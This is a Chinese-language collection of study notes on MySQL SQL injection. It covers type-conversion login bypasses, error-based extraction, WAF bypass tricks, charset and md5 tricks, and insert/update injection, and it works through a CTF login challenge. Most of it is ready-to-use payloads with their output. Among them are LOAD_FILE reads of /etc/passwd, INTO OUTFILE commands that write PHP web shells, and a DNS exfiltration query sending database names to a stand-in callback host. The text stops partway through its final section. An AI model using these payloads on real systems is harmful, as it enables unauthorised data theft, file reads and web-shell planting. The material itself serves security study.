---
title: "SQL Injection: Types, Syntax and Constraints"
title_zh: "SQL 注入进阶笔记：类型、语法与约束"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: Summary of SQL Injection
date: 2020-07-03 15:10:00
slug: Comprehensive-SQL-Injection-Summary
permalink: writing/Comprehensive-SQL-Injection-Summary/
topic: Application security
summary: "Study notes on conversions, query structure, character sets, blind inference and database metadata."
summary_zh: "从隐式类型转换出发，整理文件操作、报错、连接查询、字符集、盲注及元数据替代路径，穿插题目与函数解释，形成覆盖面较广的SQL安全学习长文。"
format_label: Technical notes
featured_rank: 0
missing_images: 6
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## False注入

### 适用场景

- false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。
- 比较多的是在登录验证的时候影响比较大，
- 在where进行限定的时候产生一些比较不可预期的错误
- 譬如删除数据的时候如果代码过滤不严，这里利用严重的可以删除整个表。
- 当然这里可以通过配合其他的姿势来进行利用



### mysql隐式类型的转换

- 如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL<=>NULL 会返回1。不做类型转换
- 两个参数都是字符串，按照字符串比较。不做类型转换
- 两个参数都是整数，按照整数比较。不做类型转换
- 如果不与数字进行比较，则将十六进制值视为二进制字符串。
- 有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳
- 有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
- **所有其他情况下，两个参数都会被转换为浮点数再进行比较**
- 如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败

### 过滤指定的字符串

trim函数可以过滤指定的字符串

```mysql
完整格式：TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM] str)
mysql> SELECT TRIM('  bar   ');  
            -> 'bar'  
mysql> SELECT TRIM(LEADING 'x' FROM 'xxxbarxxx');   --删除指定的首字符 x  
            -> 'barxxx'  
mysql> SELECT TRIM(BOTH 'x' FROM 'xxxbarxxx');      --删除指定的首尾字符 x  
            -> 'bar'  
mysql> SELECT TRIM(TRAILING 'xyz' FROM 'barxxyz');  --删除指定的尾字符 x  
            -> 'barx'  
```

### 1.1、算术运算

加：`+`

```mysql
'+',
拼接的语句：where username=''+''
```

减：`-`

```mysql
'-'
拼接的语句：where username=''-''
```

乘：`*`

```mysql
'*'
拼接的语句：where username=''*''
```

除：`/`

```mysql
'/6#
拼接的语句：where username=''/6#
```

取余：`%`

> %的原理：分子为字符串转化为0,他分母不能为0,分母为0的话结果为NULL,分母不为0的话 结果都为0



```mysql
'%1#
拼接的语句：where username=''%1#
```

### 1.2、 位操作运算

我们可以使用当字符串和数字运算的时候类型转换的问题进行利用

> 如果任一操作数为NULL，则返回NULL。 对于非NULL操作数，如果奇数个操作数非零，则求值为1，否则返回0



我们可以用的位运算符有：

和运算：`&`

```mysql
'&0#
拼接的语句：where username=''&0#'
```

或运算：`|`

```mysql
'|0#
拼接的语句：where username=''|0#'
```

异或运算：`^`

```mysql
'^0#
拼接的语句：where username=''^0#'
```

移位操作：

```mysql
'<<0#
'>>0#
```

位非（~）：这里位非运算符由于是在表达式之前的

### 1.3、 比较运算符

安全等于：`<=>`

```mysql
select 1<=>null -- 结果为0
select null <=> null -- 结果为1
'=0<=>1#
拼接的语句：where username=''=0<=>1#'
```

不等于`<>(!=)`

```mysql
'=0<>0#
拼接的语句：where username=''=0<>0#'
```

大小于`>或<`

```mysql
'>-1#
拼接的语句：where username=''>-1#
```

### 1.4、 其他

```mysql
'+1 is not null#

'in(-1,1)#    (in结果集有null不影响;)

'not in(1,0)#   (not in的结果集中出现null则查询结果为null;)

'like 1#

'REGEXP 1#

'BETWEEN 1 AND 1#

'div 1#

'xor 1#

'=round(0,1)='1

'<>ifnull(1,2)='1

```



### 1.5 综合利用

有时候如果我们的注入点不能有数字出现，比如过滤了数字，那我们该如何利用？

这里就可以利用一些内置的函数或运算来构造

```mysql
mysql> select 'aaa'=''-'';
+-------------+
| 'aaa'=''-'' |
+-------------+
|           1 |
+-------------+
1 row in set, 1 warning (0.00 sec)

mysql> select 'aaa'=~~'';
+------------+
| 'aaa'=~~'' |
+------------+
|          1 |
+------------+
1 row in set, 2 warnings (0.00 sec)

mysql> select 'aaa'=mod(pi(),pi());
+----------------------+
| 'aaa'=mod(pi(),pi()) |
+----------------------+
|                    1 |
+----------------------+
1 row in set, 1 warning (0.00 sec)
```

### 例题

这里举例一道题

```php
<?php

include("config.php");

$conn ->query("set names utf8");

function randStr($lenth=32){
    $strBase = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
    $str = "";
    while($lenth>0){
      $str.=substr($strBase,rand(0,strlen($strBase)-1),1);
      $lenth --;
    }
   return $str;
}

if($install){
    $sql = "create table `user` (
         `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,
         `username` varchar(30) NOT NULL,
         `passwd` varchar(32) NOT NULL,
         `role` varchar(30) NOT NULL
       )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci ";
    if($conn->query($sql)){
       $sql  = "insert into `user`(`username`,`passwd`,`role`) values ('admin','".md5(randStr())."','admin')";
       $conn -> query($sql);
    }
}

function filter($str){
     $filter = "/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
     if(preg_match($filter,$str)){
         die("you can't input this illegal char!");
     }
     return $str;

}


function show($username){
  global $conn;
  $sql = "select role from `user` where username ='".$username."'";
  $res = $conn ->query($sql);
  if($res->num_rows>0){

      echo "$username is ".$res->fetch_assoc()['role'];
  }else{
      die("Don't have this user!");
  }
}

function login($username,$passwd){
    global $conn;
    global $flag;

    $username = trim(strtolower($username));
    $passwd = trim(strtolower($passwd));
    if($username == 'admin'){
        die("you can't login this as admin!");
    }

    $sql = "select * from `user` where username='".$conn->escape_string($username)."' and passwd='".$conn->escape_string($passwd)."'";
    $res = $conn ->query($sql);
    if($res->num_rows>0){
        if($res->fetch_assoc()['role'] === 'admin') exit($flag);
    }else{
       echo "sorry,username or passwd error!";
    }

}

function source(){

    highlight_file(__FILE__);
}

$username = isset($_POST['username'])?filter($_POST['username']):"";
$passwd = isset($_POST['passwd'])?filter($_POST['passwd']):"";

$action = isset($_GET['action'])?filter($_GET['action']):"source";

switch($action){
   case "source": source(); break ;
   case "login" : login($username,$passwd);break;
   case "show" : show($username);break;
}
```

我们注意到filter()函数

```php
$filter = "/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
```

这里看起来过滤的比较多，其中and，or还有&，|都被过滤了，这个时候就可以利用false进行盲注。

可以在show函数利用查询的时候注入，

```sql
username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
```

这里官方给出的就是利用异或，其实这里并不需要 ’admin‘ 只要是一串字符串就可以

![历史配图暂缺](redacted-image:missing)

异或会使字符串都转为浮点数，都变为了0，由于0=0^0 -> 1^0 -> 1
当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多
还有就是构造的payload比较简短，例如`'+'、'^'、'/4#`这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。

### 1.6、结合盲注

这里false注入如果是在一些非验证的地方利用的地方基本是需要盲注，姿势比较多



## 文件操作权限

在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE()

如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用

但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所以是将这个功能禁掉了

```mysql
mysql> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | NULL  |
+------------------+-------+
```

### 2.1、读文件

```mysql
读文件函数LOAD_FILE()
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2F6574632F706173737764);
```

注意点：

1. LOAD_FILE的默认目录@@datadir
2. 文件必须是当前用户可读
3. 读文件最大的为1047552个byte, @@max_allowed_packet可以查看文件读取最大值

### 2.2、写文件

```mysql
INTO OUTFILE/DUMPFILE
SELECT '<? system($_GET['c']); ?>' INTO OUTFILE '/var/www/shell.php';

这两个函数都可以写文件，但是有很大的差别 

INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 
INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 
```

注意点：

1. INTO OUTFILE不会覆盖文件
2. INTO OUTFILE必须是查询语句的最后一句
3. 路径名是不能编码的，必须使用单引号
   创建数据库导出一句话后门，secure_file_priv 需要开启

```mysql
CREATE TABLE `mysql`.`test` (`temp` TEXT NOT NULL );
Query OK, 0 rows affected (0.12 sec)

mysql> INSERT INTO `mysql`.`test` (`temp` ) VALUES('<?php @eval($_POST[test]);?>');
Query OK, 1 row affected (0.00 sec)

mysql> select * from test;
+-----------------------------------+
| temp                              |
+-----------------------------------+
| <?php @eval($_POST[test]);?> |
+-----------------------------------+
1 row in set (0.00 sec)

SELECT `temp` FROM `test` INTO OUTFILE 'E:/123.php';
DROP TABLE IF EXISTS `test`;
```

### 2.4、正则绕过

![历史配图暂缺](redacted-image:missing)

### 2.6、特殊字符绕过空格

![历史配图暂缺](redacted-image:missing)

## 报错注入

```mysql
floor报错
有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。
（没有floor和rand函数也是不会报错的）
mysql> select count(*),concat(0x3a,database(),0x3a,floor(rand()*2))a from information_schema.tables 
group by a;
ERROR 1062 (23000): Duplicate entry ':security:1' for key 'group_key'

UpdateXml报错注入
mysql> select updatexml(0,concat(0x7e,(select database())),0);
ERROR 1105 (HY000): XPATH syntax error: '~security'

extractvalue报错注入
mysql> select extractvalue(1,concat(0x5c,(select database())));
ERROR 1105 (HY000): XPATH syntax error: '\security'

Error based Double Query Injection
mysql> select * from users where id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1;
ERROR 1062 (23000): Duplicate entry '5.5.53~1' for key 'group_key'

当一个库中不存在的自定义函数他就会爆出当前库中没有此函数，从而爆出数据库名。
mysql> select username,phone from info where id=f();
ERROR 1305 (42000): FUNCTION security.f does not exist

Polygon,linestring爆表名，库名
mysql> select username,phone from info where id=1 and Polygon(id);
ERROR 1367 (22007): Illegal non geometric '`security`.`info`.`id`' value found during parsing
mysql> select username,phone from info where id=1 and linestring(id);
ERROR 1367 (22007): Illegal non geometric '`security`.`info`.`id`' value found during parsing

                                                                exp()
select * from users where id=1 and exp(~(select * from(select user())a));
```

## 绕过未知字段名的技巧

waf拦截了information_schema、columns、tables、database、schema等关键字或函数

```mysql
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
..............

mysql> select `3` from (select 1,2,3 union select * from users)a limit 1,1;
+------+
| 3    |
+------+
| Dumb |
+------+
1 row in set (0.00 sec)

mysql> select `1`,`2`,`3` from (select 1,2,3 union select * from users)a limit 2,1;
+---+----------+------------+
| 1 | 2        | 3          |
+---+----------+------------+
| 2 | Angelina | I-kill-you |
+---+----------+------------+
1 row in set (0.00 sec)
mysql> select (select 1)a,(select 2)b,(select 3)c,(select 4)d;
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+
| 1 | 2 | 3 | 4 |
+---+---+---+---+
1 row in set (0.00 sec)

mysql> select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;
+---+---+---+---+
| 1 | 2 | 3 | 4 |
+---+---+---+---+
| 1 | 2 | 3 | 4 |
+---+---+---+---+
1 row in set (0.00 sec)

mysql> select * from (select 1)a,(select 2)b,(select 3)c union select * from users;
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
+----+----------+------------+
4 rows in set (0.00 sec)

mysql> select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;
+------------+
| 3          |
+------------+
| 3          |
| Dumb       |
| I-kill-you |
| p@ssword   |
+------------+
4 rows in set (0.00 sec)

mysql> select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 3;
+----------+
| 3        |
+----------+
| p@ssword |
+----------+
1 row in set (0.00 sec)

mysql> select * from users where id=1 union select (select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 3)f,(select 1)g,(select 1)h;
+----------+----------+----------+
| id       | username | password |
+----------+----------+----------+
| 1        | Dumb     | Dumb     |
| p@ssword | 1        | 1        |
+----------+----------+----------+
2 rows in set (0.00 sec)
```

如果不允许使用union

```mysql
mysql> select * from users where id=1 and (select * from (select * from users as a join users as b)
as c);
ERROR 1060 (42S21): Duplicate column name 'id'

利用using爆其他字段
mysql> select * from users where id=1 and (select * from (select * from users as a join users as b 
using(id))as c);
ERROR 1060 (42S21): Duplicate column name 'username'

mysql> select * from users where id=1 and (select * from (select * from users as a join users as b
using(id,username))as c);
ERROR 1060 (42S21): Duplicate column name 'password'
```

**这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。**
[详解mysql中的Using与On的用法](http://www.mamicode.com/info-detail-138723.html)

## 使用Join查询

**在联合查询的时候，查询填充的列分割较多时，就会被waf拦截**

```mysql
mysql> select * from users union select * from (select 1)a join (select 2)b join (select 3)c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
|  1 | 2        | 3          |
+----+----------+------------+
14 rows in set (0.00 sec)
```

## Mysql约束攻击

**在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）
在mysql数据库中当插入某个字段的值超过了预设的长度,mysql会自动造成截断.**

```mysql
mysql>  create table user(id int primary key,user varchar(10),pwd varchar(20));
Query OK, 0 rows affected (0.38 sec)

mysql> insert into user value(1,'admin','123');
Query OK, 1 row affected (0.00 sec)

mysql> insert into user value(2,'admin          ','456');
Query OK, 1 row affected, 1 warning (0.00 sec)

mysql> select * from user;
+----+------------+------+
| id | user       | pwd  |
+----+------------+------+
|  2 | admin      | 456  |
|  1 | admin      | 123  |
+----+------------+------+
2 rows in set (0.00 sec)

mysql> select length(user) from user;
+--------------+
| length(user) |
+--------------+
|           10 |
|            5 |
+--------------+
2 rows in set (0.00 sec)
长度是不一样的,但是在受影响的版本中,id=2的user值admin          在前端登录处登录并且在后端验证中,admin
是等同id=1的user值admin的.
```

[基于约束的SQL攻击](http://www.freebuf.com/articles/web/124537.html)
  

## IN

在过滤等号或者过滤like等的sql注入情况下IN很有用

```mysql
mysql> select * from users where id in (1,2);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
+----+----------+------------+
2 rows in set (0.00 sec)

mysql> select substr('abc',1,1) in ('z');
+----------------------------+
| substr('abc',1,1) in ('z') |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (0.00 sec)

mysql> select substr('abc',1,1) in ('a');
+----------------------------+
| substr('abc',1,1) in ('a') |
+----------------------------+
|                          1 |
+----------------------------+
1 row in set (0.00 sec)
```

## Between

BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。

```mysql
mysql> select * from users where id between 1 and 3;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
+----+----------+------------+
3 rows in set (0.00 sec)

mysql> select * from users where username between 'sa' and 'sz';
+----+----------+-----------+
| id | username | password  |
+----+----------+-----------+
|  4 | secure   | crappy    |
|  5 | stupid   | stupidity |
|  6 | superman | genious   |
+----+----------+-----------+
3 rows in set (0.00 sec)

还支持16进制
mysql> select * from users where username between 0x7365 and 0x737a;
+----+----------+-----------+
| id | username | password  |
+----+----------+-----------+
|  4 | secure   | crappy    |
|  5 | stupid   | stupidity |
|  6 | superman | genious   |
+----+----------+-----------+
3 rows in set (0.00 sec)

可以结合字符串截取进行盲注
mysql> select * from users where substr(username,1,1) between 'a' and 'd';
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
+----+----------+------------+
5 rows in set (0.00 sec)
```

## 列名被ban，自己构造

```mysql
mysql> select 1,2,3 union select * from users;
+----+----------+------------+
| 1  | 2        | 3          |
+----+----------+------------+
|  1 | 2        | 3          |
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
+----+----------+------------+
6 rows in set (0.00 sec)

mysql> select passwd from (select 1,2,3 as passwd union select * from users)as twoname;
+------------+
| passwd     |
+------------+
| 3          |
| Dumb       |
| I-kill-you |
| p@ssword   |
| crappy     |
| stupidity  |
+------------+
6 rows in set (0.00 sec)
```

## limit下的字段数判断

```mysql
mysql> select * from users limit 1,1 into @,@;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select * from users limit 1,1 into @,@,@;
Query OK, 1 row affected (0.00 sec)
```

**or条件下前后如果都为真则返回所有结果，否则只返回条件为真的一方的值**

## BENCHMARK

**BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果**

```mysql
mysql> select if(left(version(),1)=5,BENCHMARK(10000000,SHA('1')),1);
+--------------------------------------------------------+
| if(left(version(),1)=5,BENCHMARK(10000000,SHA('1')),1) |
+--------------------------------------------------------+
|                                                      0 |
+--------------------------------------------------------+
1 row in set (3.60 sec)
```

## 绕过 `\' `过滤

```mysql
hex编码
SELECT password FROM Users WHERE username = 0x61646D696E

char编码
SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)

%2527
主要绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是'，所以成功绕过过滤。
```

## Mysql字符编码利用

**传入的username=admin%c2，php的检测if ($username === ‘admin’)自然就可以绕过的，在mysql中可以正常查出username=’admin’的结果，原理是Mysql在转换字符集的时候，将不完整的字符给忽略了**

```mysql
造成这个Trick的根本原因是，Mysql字段的字符集和php mysqli客户端设置的字符集不相同。
set names utf8 的意思是将客户端的字符集设置为utf8

在默认情况下，mysql字符集为latin1，而执行了set names utf8;以后，character_set_client、
character_set_connection、character_set_results等与客户端相关的配置字符集都变成了utf8，但
character_set_database、character_set_server等服务端相关的字符集还是latin1。
```

**2008年鸟哥曾在博客中讲解了Mysql字符集：**

> 1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；
> 2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集

```mysql
character_set_client和character_set_connection被设置成了utf8，而内部操作字符集其实也就是username字段的
字符集还是默认的latin1。于是，整个操作就有如下字符串转换过程：

utf8 --> utf8 --> latin1

最后执行比较username='admin'的时候，'admin'是一个latin1字符串。
```

[phithon的文章](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)

## md5注入

```mysql
$sql = "SELECT * FROM admin WHERE username = admin pass ='".md5($password,true)."'";
```

**当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为'or' 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。**

## Update 和 Insert注入

### 闭合后构造

```mysql
insert into users values (17,'注入点', 'bond');
```

**若第一个参数可控，则可以将注入点闭合后，在后面使用不被单引号闭合的select语句，将查询结果插入表中，然后再想办法通过正常途径查看。**
\* 数字相加

```mysql
insert into users values (17,'join', '注入点');
```

**注入点变为了第二个，不能同闭合直接构造。但可以通过把想要获取的数据转换为数字，然后与原字符串相加，获取数字后再还原回来。**

```mysql
insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);

CONV(N,from_base,to_base)
mysql> select 'sssdasd'|2;
+-------------+
| 'sssdasd'|2 |
+-------------+
|           2 |
+-------------+
1 row in set, 1 warning (0.00 sec)

mysql> select '1sssdasd'|2;
+--------------+
| '1sssdasd'|2 |
+--------------+
|            3 |
+--------------+
1 row in set, 1 warning (0.00 sec)
```

### 构造错误

```mysql
INSERT INTO table 1 VALUES (‘注入点’);
```

**对于非SELECT注入，如果成功执行的话会修改数据库数据。实战过程中不但会破坏数据库结构（白帽子挖洞的时候很可能因为这个违法），还容易引起管理员注意。所以在不让SQL语句正常执行的情况下获取数据是最好的方法。**

```
INSERT INTO table 1 VALUES (''+  SELECT CASE WHEN @@version LIKE '5.1.56%' 
THEN SLEEP(5) ELSE 'somevale' END + '');
```

**因为返回了多列数据，该insert语句并不会执行，但是内部的select语句和sleep函数会照常执行，也就可以通过写脚本获取数据了。**

## 报错注入

```mysql
mysql> insert into users value(null,'p' and extractvalue(1,concat(0x7e,(select @@version),0x7e)));
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'
mysql> update users set username='test' where id=1 and extractvalue(1,concat(0x7e,(select @@version),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'
```

## DNSLOG注入

利用unc路径配合load_file()函数可以用来发送dns解析请求，把查询结果放在多级域名中解析，然后能够在dns服务器的解析日志中获取查询结果。
\- unc路径是windows下的特性，默认安装的linux下不存在这样的功能。
\- 因为存在dns缓存，请求过一次域名后，会在本机产生dns记录，不会向外递归查询，所以unc路径中DNS域名不能相同。通过在域名中添加随机字符串'rMy','Nrz'确保每次查询dns不存在缓存
\- unc路径长度不能过长，unc路径最大长度为128，可以通过使用substring（）函数每次传输特定位数的数据。
\- unc路径中不能含有空格等特殊字符，包含的话不会发送dns请求。可以对获得数据进行hex编码

**DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。**
dnslog平台：http://ceye.io/

```mysql
mysql> use security;
Database changed

mysql> select load_file('\\\\test.callback.example.com\\abc');
+-------------------------------------------+
| load_file('\\\\test.callback.example.com\\abc') |
+-------------------------------------------+
| NULL                                      |
+-------------------------------------------+
1 row in set (22.05 sec)

mysql> select load_file(concat('\\\\',(select database()),'.callback.example.com\\abc'));
+----------------------------------------------------------------------+
| load_file(concat('\\\\',(select database()),'.callback.example.com\\abc')) |
+----------------------------------------------------------------------+
| NULL                                                                 |
+----------------------------------------------------------------------+
1 row in set (0.00 sec)
```

## Bypass WAF

```mysql
一些WAF只过滤小写的SQL关键字。
http://target.example.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--

某些应用程序和WAF使用preg_replace删除所有SQL关键字。
http://target.example.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--

大多数CMS和WAF将解码和过滤/绕过应用程序输入，但一些WAF只能解码输入一次 
双编码可以绕过某些滤波器，因为WAF将解码输入一次，然后在应用程序保持时进行滤波解码执行的SQL语句

使用C语言编写的WAF容易溢出，或者在加载一堆数据时采取不同的行为。提供大量的数据可以让我们的代码执行 

内联注释（仅限Mysql）
/*!50000SeLeCt*/大于5.0的版本可以执行

使用~
mysql> select * from user union select 1,2,~3,~4;
+----+----------+----------------------------------+----------------------+
| id | username | passwd                           | role                 |
+----+----------+----------------------------------+----------------------+
|  1 | admin    | [REDACTED_EXAMPLE_HASH] | admin                |
|  1 | 2        | 18446744073709551612             | 18446744073709551611 |
+----+----------+----------------------------------+----------------------+
2 rows in set (0.00 sec)

使用小数点(.)
mysql> select * from user union select 1,2,.3,.4;
+----+----------+----------------------------------+-------+
| id | username | passwd                           | role  |
+----+----------+----------------------------------+-------+
|  1 | admin    | [REDACTED_EXAMPLE_HASH] | admin |
|  1 | 2        | 0.3                              | 0.4   |
+----+----------+----------------------------------+-------+
2 rows in set (0.00 sec)

使用字符（*9e0）
*9e0和前面的id=1′和起来，后台查询语句可能就变成了select * from user where id='1'*9e0;而在mysql中9e0表示9乘10的0次方，所以mysql会把上面字符串1强制转换成数值1再乘9，语句也就变成了select * from article where id='1′
mysql> select * from user where id='1' *9e0 union select 1,2,3,4;
+----+----------+--------+------+
| id | username | passwd | role |
+----+----------+--------+------+
|  1 | 2        | 3      | 4    |
+----+----------+--------+------+
1 row in set (0.00 sec)

字符串前如from前加e0
mysql> select * from user where id=1 union select 1,2,3,4e0from user;
+----+----------+----------------------------------+-------+
| id | username | passwd                           | role  |
+----+----------+----------------------------------+-------+
|  1 | admin    | [REDACTED_EXAMPLE_HASH] | admin |
|  1 | 2        | 3                                | 4     |
+----+----------+----------------------------------+-------+
2 rows in set (0.00 sec)
```

## innodb

**`MySQL 5.7`之后的版本，在其自带的 mysql 库中，新增了`innodb_table_stats` 和`innodb_index_stats`这两张日志表。如果数据表的引擎是`innodb` ，则会在这两张表中记录表、键的信息 。**
如果waf掉了information我们可以利用这两个表注入数据库名和表名。

```mysql
mysql> select * from mysql.innodb_table_stats;
+---------------+---------------+---------------------+--------+----------------------+--------------------------+
| database_name | table_name    | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+---------------+---------------+---------------------+--------+----------------------+--------------------------+
| challenges    | ZGRW907ENU    | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |
| dvwa          | guestbook     | 2018-04-21 23:00:47 |      0 |                    1 |                        0 |
| dvwa          | users         | 2018-04-21 23:00:57 |      5 |                    1 |                        0 |
| mysql         | gtid_executed | 2018-04-21 22:47:54 |      0 |                    1 |                        0 |
| security      | emails        | 2018-05-18 01:55:43 |      8 |                    1 |                        0 |
| security      | fish_admin    | 2018-11-27 18:28:51 |      0 |                    1 |                        1 |
| security      | flag          | 2018-09-18 05:16:14 |      0 |                    1 |                        0 |
| security      | referers      | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |
| security      | uagents       | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |
| security      | users         | 2018-05-18 01:55:43 |     13 |                    1 |                        0 |
| sys           | sys_config    | 2018-04-21 22:47:54 |      2 |                    1 |                        0 |
+---------------+---------------+---------------------+--------+----------------------+--------------------------+
11 rows in set (0.08 sec)

mysql> mysql> select * from mysql.innodb_index_stats;
+---------------+---------------+------------+---------------------+--------------+------------+-------------+-----------------------------------+
| database_name | table_name    | index_name | last_update         | stat_name    | stat_value | sample_size | stat_description                  |
+---------------+---------------+------------+---------------------+--------------+------------+-------------+-----------------------------------+
| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | n_diff_pfx01 |          0 |           1 | sessid                            |
| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | size         |          1 |        NULL | Number of pages in the index      |
| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | n_diff_pfx01 |          0 |           1 | comment_id                        |
| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | size         |          1 |        NULL | Number of pages in the index      |
| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | n_diff_pfx01 |          5 |           1 | user_id                           |
| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | size         |          1 |        NULL | Number of pages in the index      |
| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_diff_pfx01 |          0 |           1 | source_uuid                       |
| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_diff_pfx02 |          0 |           1 | source_uuid,interval_start        |
| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | size         |          1 |        NULL | Number of pages in the index      |
| security      | emails        | PRIMARY    | 2018-05-18 01:55:43 | n_diff_pfx01 |          8 |           1 | id                                |
| security      | emails        | PRIMARY    | 2018-05-18 01:55:43 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
...............
```

## sys

MySQL 5.7版中，新加入了`sys` schema，里面整合了各种资料库资讯
其中对我们最有用的资讯大概就是`statement_analysis`表中的`query`，里面纪录着我们执行过的SQL语句（normalize过的）和一些数据。

```mysql
mysql> select version();
+-----------+
| version() |
+-----------+
| 8.0.13    |
+-----------+
